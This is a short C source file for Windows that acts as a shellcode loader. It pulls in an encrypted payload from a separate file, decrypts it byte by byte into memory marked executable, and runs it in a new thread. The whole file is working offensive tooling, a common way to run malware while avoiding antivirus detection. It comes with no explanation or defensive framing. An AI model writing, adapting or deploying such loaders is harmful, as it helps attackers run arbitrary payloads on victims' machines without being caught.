#include <windows.h>
#include <stdio.h>
#include "encrypted_shellcode.c"

int main() {
    SIZE_T shellcode_size = sizeof(encrypted_shellcode);

    printf("Allocate memory in the current process\n");
    LPVOID exec_mem = VirtualAlloc(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_mem == NULL) {
        printf("Failed to allocate memory\n");
        return 1;
    }

    printf("Write the shellcode into the allocated memory\n");
    SIZE_T bytes_written;
    unsigned char buf;
    for (int i=0; i < sizeof(encrypted_shellcode); i++){
        buf = get_shellcode_byte(i);
        if (!WriteProcessMemory(GetCurrentProcess(), exec_mem+i, &buf, sizeof(buf), &bytes_written)) {
            printf("Failed to write process memory\n");
            VirtualFree(exec_mem, 0, MEM_RELEASE);
            return 1;
        }
    }

    printf("Create a thread to execute the shellcode\n");
    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    if (thread == NULL) {
        printf("Failed to create thread\n");
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return 1;
    }

    // Wait for the thread to complete
    WaitForSingleObject(thread, INFINITE);

    // Clean up
    CloseHandle(thread);
    VirtualFree(exec_mem, 0, MEM_RELEASE);

    return 0;
}